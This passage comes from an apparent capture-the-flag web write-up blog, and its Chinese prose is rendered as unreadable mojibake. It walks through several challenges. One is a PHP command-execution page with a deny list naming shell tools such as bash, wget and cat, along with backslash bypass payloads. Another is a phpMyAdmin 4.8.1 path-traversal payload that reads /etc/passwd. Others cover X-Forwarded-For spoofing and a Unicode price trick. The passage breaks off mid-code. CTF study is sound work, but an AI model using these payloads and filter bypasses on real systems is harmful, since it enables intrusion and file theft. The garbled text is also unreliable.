ä¸ºè¿™ä¸ª<code>img</code>å’Œ<code>cmd</code>å‚æ•°éƒ½æ˜¯åœ¨index.phpä¸‹çš„ï¼Œé‚£å°±ç›´æ¥çœ‹<code>index.php</code>æ˜¯å•¥ä¸œè¥¿(ç”¨åŒæ ·çš„æ–¹æ³•è½¬æ¢):img&#x3D;<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <span class="hljs-comment">//å¦‚æœä¸¤ä¸ªå‚æ•°å…¶ä¸­ä¸€ä¸ªæ²¡è¢«èµ‹å€¼</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<span class="hljs-comment">//imgè§£ç </span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<span class="hljs-comment">//æ³¨æ„^ï¼Œä¼šæ­£åˆ™åŒ¹é…éå¤§å°å†™å­—æ¯åŠæ•°å­—å’Œç‚¹ï¼Œæ¢æˆç©ºæ ¼</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;<span class="hljs-comment">//å¤§å°å†™åŒ¹é…flag</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));<span class="hljs-comment">//åˆ©ç”¨file_get_contentsè¯»ç›®æ ‡æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä½¿ç”¨base64åŠ å¯†</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<span class="hljs-comment">//ä¸€å¼€å§‹æƒ³çš„æ•°ç»„ç»•è¿‡å³$a[]=1è€Œä¸”$b[]=2ï¼Œä¸è¿‡ä»–å‰é¢æœ‰ä¸ª(string)å¼ºåˆ¶ç±»å‹è½¬æ¢(string(5) &quot;Array&quot;)ï¼Œåªèƒ½æ‰¾ç¢°æ’ç»•è¿‡äº†ã€‚</span><br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<span class="hljs-comment">//æ³¨æ„åå¼•å·ï¼Œæ‰§è¡Œå‘½ä»¤çš„ç»“æ„ç›´æ¥echo</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br>&lt;style&gt;<br>  body&#123;<br>   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;<br>   background-size:cover;<br>   background-attachment:fixed;<br>   background-color:<span class="hljs-comment">#CCCCCC;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>æœ€å¼€å§‹æ­£åˆ™åŒ¹é…<code>\</code>é‚£é‡Œæ²¡å¼„æ˜ç™½ï¼Œä¸€å¼€å§‹è§‰å¾—<code>|\\|\\\\|</code>è¿™ä¿©ä¸œè¥¿å°±ä¼šæŠŠ<code>\</code>è¿™ä¸œè¥¿ç»™åŒ¹é…äº†ï¼Œå»ç½‘ä¸Šæœäº†wpå‘ç°éƒ½è¯´ç›´æ¥<code>l\s</code>å°±èƒ½ç»•è¿‡ã€‚åé¢å‘ç°è‡ªå·±æƒ³é”™äº†ï¼Œ<code>|\\|\\\\|</code>è¿™ä¸œè¥¿å¹¶ä¸ä¼šåŒ¹é…åˆ°<code>\</code>ï¼Œéœ€è¦<code>\\\</code>æ‰è¡Œã€‚ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°\\&#x27;</span>);<span class="hljs-comment">//ä¸€ä¸ªåæ–œæ éœ€è¦å¦ä¸€ä¸ªåæ–œæ è¿›è¡Œè½¬ä¹‰ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªåæ–œæ </span><br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ—¶æˆ‘ä»¬ä¼ <code>?b=</code>ä»»ä½•å€¼éƒ½ä¼šæŠ¥é”™ï¼š</p><p><code> **Warning**:  preg_match(): No ending delimiter &#39;/&#39; found in **D:\phpstudy_pro\WWW\wow.php** on line **4**</code></p><p>ç”µè„‘æ²¡æœ‰æ‰¾åˆ°<code>/</code>è¿™ä¸ªç»“æŸå®šç•Œç¬¦ã€‚æƒ³äº†ä¸‹åŸå› ï¼Œæ—¢ç„¶<code>\</code>è¿™ä¸ªä¸œè¥¿æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œé‚£ä¹ˆ<code>\\</code>åªä¸è¿‡æ˜¯ä¸€ä¸ªè½¬ä¹‰åçš„<code>\</code>ï¼Œè¿™ä¸ªä¸œè¥¿å’Œ<code>/</code>ç»„åˆåˆ°ä¸€èµ·ä¼šå»æ­£åˆ™åŒ¹é…<code>/</code>è¿™ä¸ªä¸œè¥¿ï¼Œè¿™æ ·ä¸€æ¥å¯¼è‡´ç¼ºå°‘å°¾éƒ¨ç•Œå®šç¬¦ã€‚ä¿®æ”¹ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\//i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ—¶ä¸ä¼šæŠ¥é”™è€Œä¸”å›å»æ­£åˆ™åŒ¹é…<code>/</code>ï¼Œç°åœ¨æ€è·¯å°±æ¸…æ™°äº†ï¼šå¦‚æœæˆ‘ä»¬æƒ³æ­£åˆ™åŒ¹é…<code>\</code>ï¼Œé‚£ä¹ˆå°±éœ€è¦<code>\\\</code>æ‰è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨å†çœ‹çœ‹è¿™æ®µæ­£åˆ™åŒ¹é…æ€ä¹ˆä¸ªäº‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„<code>|\\|\\\\|</code>ï¼Œè¿™ä¸œè¥¿ç›¸å½“äºå»åŒ¹é…<code>|\\\\</code>ã€‚å› ä¸ºå‰ä¸¤ä¸ª<code>\\</code>å›å»è½¬ä¹‰åé¢é‚£ä¸ªåˆ†éš”ç¬¦<code>|</code>ï¼Œå†åŠ ä¸Š<code>\\\\</code>ï¼Œç„¶åä»¥<code>|</code>æ”¶å°¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$string</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$string</span>))&#123;<br><br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ£€æµ‹åˆ°&#x27;</span>);<br>   &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;æ²¡æ£€æµ‹åˆ°&#x27;</span>);<br><br>   &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åªæœ‰ä¼ <code>?b=|\\\\</code>æ‰ä¼š<code>echo</code>æ£€æµ‹åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»å¯ä»¥åˆ©ç”¨<code>\</code>è¿›è¡Œå‘½ä»¤æ‹¼æ¥ï¼Œæ¯”å¦‚<code>l\s</code>ï¼Œ<code>l\s%20/</code>,<code>c\at%20fl\ag</code>ç­‰ã€‚</p><p>åœ¨burpä¸­å¦‚æœä½¿ç”¨ç©ºæ ¼ä¼šè¢«è¯†åˆ«ä¸ºå…¶ä»–çš„å‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œç©ºæ ¼ç”¨<code>%20</code>æ›¿æ¢ã€‚</p><p>ç»¼ä¸Šï¼Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå¾—åˆ°flagã€‚</p><h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2><p><img src="/img/db1.png" alt="db1"></p><p>???</p><p>ç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œå‘ç°<code>robots.txt</code>è¿˜æœ‰<code>/phpmyadmin/</code>ï¼Œçœ‹çœ‹éƒ½æœ‰å•¥ï¼š</p><p><code>robots.txt</code>æç¤º<code>phpinfo.php</code>ï¼Œ<code>/phpmyadmin/</code>ä¸ç™»å½•å¯ä»¥ç›´æ¥è®¿é—®æ•°æ®åº“ç®¡ç†ç•Œé¢ï¼š</p><p><img src="/img/db2.png" alt="db2"></p><p>åé¢å°±æ— å¤„ä¸‹æ‰‹äº†ã€‚ã€‚å»ç½‘ä¸ŠæŸ¥äº†ä¸€ä¸‹<code>wp</code>ï¼Œè¿™é¢˜è€ƒçš„æ˜¯<code>phpmyadmin4.8.1</code>ç‰ˆæœ¬å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´:<code>include $_REQUEST[&#39;target&#39;];</code></p><p>ç›´æ¥åˆ©ç”¨ç°æˆçš„<code>payload</code>:<code>target=db_sql.php%253f/../../../../../../../../etc/passwd</code>ï¼Œå‘ç°å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ã€‚åé¢å†ç¿»ç¿»<code>flag</code>çš„ä½ç½®å°±è¡Œäº†ã€‚</p><p><code>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</code></p><p><code>flag&#123;14b071f4-a712-4a14-b3ce-d6bc07df4506&#125;</code></p><p>ä¸è¿‡æˆ‘çœ‹æ–‡ç« ä¸­éƒ½å†™äº†<code>$_REQUEST[&#39;target&#39;]</code>ï¼Œä½†å°è¯•<code>POST</code>æäº¤æ‹¿ä¸åˆ°ç»“æœã€‚è€Œä¸”åœ¨<code>?target</code>å‰åŠ ä¸ª<code>/</code>å°±ç™½å±äº†ã€‚ã€‚ä¸è¿‡å³é”®çœ‹æºç è¿˜æ˜¯èƒ½çœ‹åˆ°å›æ˜¾ï¼Œä¸çŸ¥é“å’‹å›äº‹ã€‚</p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>è¿›ç¯å¢ƒå‘ç°æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/flagpy1.png" alt="flagpy1"></p><p>çœ‹ä¸‹æºç ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">code</span>)&#123;<br>  hash = <span class="hljs-title function_">hex_md5</span>(code);<br>  <span class="hljs-keyword">return</span> hash;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> code = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;vcode&quot;</span>).<span class="hljs-property">value</span>;<span class="hljs-comment">//è·å–ç”¨æˆ·çš„è¾“å…¥</span><br>  <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">hex_md5</span>(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;æ‚¨é€šè¿‡äº†éªŒè¯ï¼&quot;</span>);<br>      <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span> = <span class="hljs-string">&quot;./flag.php&quot;</span><span class="hljs-comment">//é‡å®šå‘åˆ°å½“å‰ç›®å½•ä¸‹çš„flag.php</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;ä½ çš„æˆæƒç ä¸æ­£ç¡®ï¼&quot;</span>);<br>    &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æˆæƒç &quot;</span>);<br>  &#125;<br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹å®Œæƒ³äº†ä¸€ä¸‹ï¼Œç›´æ¥å»<code>flag.php</code>çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ï¼š</p><p><code>http://node4.buuoj.cn:25037/flag.php</code></p><p><img src="/img/flagpy2.png" alt="flagpy2"></p><p>æç¤ºä¿å­˜äº†è´­ä¹°è€…çš„IPï¼Œå¯ä»¥åˆ©ç”¨<code>XFF</code>ä¼ªé€ ã€‚<code>é™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Œæ²¡æœ‰äººå¯ä»¥çœ‹åˆ°flag</code>ï¼Œç›´æ¥<code>XFF 127.0.0.1</code>è¯•è¯•ï¼Ÿ</p><p><img src="/img/flagpy3.png" alt="flagpy3"></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>é¢˜ç›®æç¤º<code>unicode</code>å’Œ<code>python</code></p><p>äº†è§£äº†ä¸‹<code>unicode</code>ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Unicode</span>æ˜¯ä¸€ç§å­—ç¬¦ç¼–ç æ ‡å‡†ï¼Œç”¨äºè¡¨ç¤ºæ–‡æœ¬ä¸­çš„å­—ç¬¦ã€‚å®ƒä¸ºä¸–ç•Œä¸Šå‡ ä¹æ‰€æœ‰çš„å­—ç¬¦éƒ½åˆ†é…äº†ä¸€ä¸ªå”¯ä¸€çš„æ•°å­—æ ‡è¯†ï¼Œè¿™ä¸ªæ ‡è¯†è¢«ç§°ä¸º<span class="hljs-string">&quot;ç ç‚¹&quot;</span>ã€‚Unicodeçš„ç›®æ ‡æ˜¯ä¸ºå…¨çƒèŒƒå›´å†…çš„æ‰€æœ‰å­—ç¬¦æä¾›ä¸€ä¸ªç»Ÿä¸€çš„ç¼–ç æ–¹æ¡ˆï¼Œä»¥è§£å†³ä¸åŒå›½å®¶å’Œåœ°åŒºä½¿ç”¨ä¸åŒå­—ç¬¦ç¼–ç çš„é—®é¢˜ã€‚<br><br><span class="hljs-attribute">Unicode</span>ä½¿ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºæ¯ä¸ªå­—ç¬¦çš„ç ç‚¹ï¼Œä¾‹å¦‚å­—æ¯<span class="hljs-string">&quot;A&quot;</span>çš„ç ç‚¹æ˜¯U+<span class="hljs-number">0041</span>ï¼Œæ±‰å­—<span class="hljs-string">&quot;ä¸­&quot;</span>çš„ç ç‚¹æ˜¯U+<span class="hljs-number">4</span>E2Dã€‚Unicodeå®šä¹‰äº†è¶…è¿‡<span class="hljs-number">130</span>,<span class="hljs-number">000</span>ä¸ªç ç‚¹ï¼Œå…¶ä¸­åŒ…æ‹¬å„ç§è¯­è¨€çš„å­—ç¬¦ã€æ ‡ç‚¹ç¬¦å·ã€ç¬¦å·ã€è¡¨æƒ…ç¬¦å·ç­‰ã€‚<br></code></pre></td></tr></table></figure><p><img src="/img/us1.png" alt="us1"></p><p>è¯•äº†è¯•è´­ä¹°å‰ä¸‰ç§éƒ½æç¤ºï¼š</p><p><img src="/img/unishop2.png" alt="unishop2"></p><p>ä¹°æœ€åä¸€ä¸ªä¼šæ˜¾ç¤º:<code>Only one char(?) allowed!</code>ï¼Œæ„æ€æ˜¯è¿™ä¸ª<code>Price</code>åªèƒ½å¡«ä¸€ä¸ªå­—ç¬¦ï¼Ÿæºç é‡Œé¢æœ‰ä¸‹é¢è¿™æ®µæç¤ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">meta charset=&quot;utf-8&quot;&gt;<span class="hljs-comment">&lt;!--Ah,really important,seriously. --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Unicorn shop<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-comment">&lt;!-- Don&#x27;t be frustrated by the same view,we&#x27;ve changed the challenge content.--&gt;</span><br></code></pre></td></tr></table></figure><p>å»ç½‘ä¸Šæ‰¾äº†ä¸‹wpï¼Œå’Œæç¤ºçš„<code>Unicode</code>æœ‰å…³ï¼šå…ˆæŠŠ<code>Item ID</code>å’Œ<code>Price</code>éƒ½æ”¾ç©ºï¼Œçœ‹çœ‹æŠ¥é”™ä¿¡æ¯ï¼š</p><p><img src="/img/unishop3.png" alt="unishop3"></p><p>å¯ä»¥å‘ç°ä»–ç”¨äº†<code>unicodedata.numeric()</code>å‡½æ•°å»å¤„ç†è¿™ä¸ª<code>price</code>ï¼Œè¿™ä¸œè¥¿ä¼šè·å– Unicode å­—ç¬¦çš„æ•°å€¼è¡¨ç¤ºï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&gt;&gt;&gt; import unicodedata<br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-number">1.0</span><br>&gt;&gt;&gt; unicodedata.<span class="hljs-keyword">numeric</span>(<span class="hljs-string">&#x27;11&#x27;</span>)<br>Traceback (most recent call <span 